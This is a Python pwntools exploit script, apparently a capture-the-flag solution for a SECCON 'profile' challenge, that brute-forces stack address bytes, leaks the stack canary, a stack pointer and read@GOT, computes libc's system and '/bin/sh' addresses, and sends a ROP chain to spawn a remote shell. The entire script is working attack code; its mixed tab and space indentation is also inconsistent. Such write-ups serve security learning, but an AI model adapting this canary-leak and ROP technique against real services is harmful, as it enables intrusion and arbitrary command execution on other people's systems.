from pwn import *

import sys

stream_int = _ZNSolsEi = 0x0000000000400e10
cout = 0x0000000000602220 # pass into rdi
read_got = 0x602028
bss_string = 0x0
update_msg = 0x000000000040155a
pop_rdi = 0x0000000000401713

if '--debug' in sys.argv:
        r = process('./profile_e814c1a78e80ed250c17e94585224b3f3be9d383')
	offset_read = 0xe91c0
	offset_system = 0x435d0
        offset_str_bin_sh = 0x17f573
else:
        r = remote('profile.pwn.seccon.jp', 28553)
	offset_read = 0xf7250
	offset_system = 0x45390
        offset_str_bin_sh = 0x18cd57
main = 0x00000000004011dd


r.sendlineafter('Name >> ', 'abcdefg')
r.sendlineafter('Age >> ', '9')
r.sendlineafter('Message >> ', 'ijklmno')
### padding + canary + pad(24 byte) + ROP
## Stage 0 : brute force stack address
# check lsB 0 and 1
lsB0 = -1
for i in range(16):
    r.sendlineafter('>> ', '1')
    payload0 = 'A'*8 + p64(update_msg) + chr(i*0x10)
    r.sendlineafter('>> ', payload0)
    # r.interactive()
    r.sendlineafter('>> ', '2')
    r.recvuntil('Name : ')
    name = r.recvline().strip()
    # print name
    if name == 'AAAAAAA':
        lsB0 = i*0x10
        log.info('lsB0 : ' + hex(lsB0))
        break
if lsB0 == -1:
    print 'Try again'
    exit()
# brute lsB1
lsB1 = -1
for i in range(256):
    r.sendlineafter('>> ', '1')
    payload0 = 'A'*8 + p64(update_msg) +chr(lsB0) + chr(i)
    r.sendlineafter('>> ', payload0)
    # r.interactive()
    r.sendlineafter('>> ', '2')
    r.recvuntil('Name : ')
    name = r.recvline().strip()
    # print str(i) + ': ' + name
    if name == 'AAAAAAA':
        lsB1 = i
        log.info('lsB1 : ' + hex(lsB1))
        break
# print canary
r.sendlineafter('>> ', '1')
payload0 = 'A'*8 + p64(update_msg) + p64(lsB1*0x100+lsB0+0x38)[:2]
# gdb.attach(r)
r.sendlineafter('>> ', payload0)
# r.interactive()
r.sendlineafter('>> ', '2')
r.recvuntil('Name : ')
name = r.recv(7)
# log.info(name)
r.recvline()
locan = u64(name+'\x00')
log.info('locan: ' + hex(locan))
# print canary 2
r.sendlineafter('>> ', '1')
payload0 = 'A'*8 + p64(update_msg) + p64(lsB1*0x100+lsB0+0x39)[:2]
# gdb.attach(r)
r.sendlineafter('>> ', payload0)
# r.interactive()
r.sendlineafter('>> ', '2')
r.recvuntil('Name : ')
name = r.recv(7)
r.recvline()
hican = u64('\x00'+name)
log.info('hican: ' + hex(hican))
canary = (hican^locan) + locan
log.info('canary: ' + hex(canary))


# print stackpointer
r.sendlineafter('>> ', '1')
payload0 = 'A'*8 + p64(update_msg) + p64(lsB1*0x100+lsB0-0x10)[:2]
# gdb.attach(r)
r.sendlineafter('>> ', payload0)
# r.interactive()
r.sendlineafter('>> ', '2')
r.recvuntil('Name : ')
name = r.recv(7)
r.recvline()
stackleak = u64(name+'\x00') + 0x20
log.info('stackleak: ' + hex(stackleak))


## Stage 1 : print content of read@GOT
# print read
r.sendlineafter('>> ', '1')
payload0 = 'A'*8 + p64(update_msg) + p64(read_got)
# gdb.attach(r)
r.sendlineafter('>> ', payload0)
# r.interactive()
r.sendlineafter('>> ', '2')
r.recvuntil('Name : ')
name = r.recv(7)
r.recvline()
read = u64(name+'\x00')
log.info('read: ' + hex(read))

system = read - offset_read + offset_system
str_bin_sh = read - offset_read + offset_str_bin_sh

log.info('/bin/sh: ' + hex(str_bin_sh))

## test canary + ROP
# r.interactive()
r.sendlineafter('>> ', '1')
payload2 = 'A'*8 + p64(update_msg) + p64(stackleak) + 'A'*32 + p64(canary) + 'A'*8*3 + p64(pop_rdi) + p64(str_bin_sh) +\
        p64(system)
r.sendlineafter('>> ', payload2)
# gdb.attach(r)

## exiting and ROP
r.sendlineafter('>> ', '0')

## spawn shell
r.interactive()
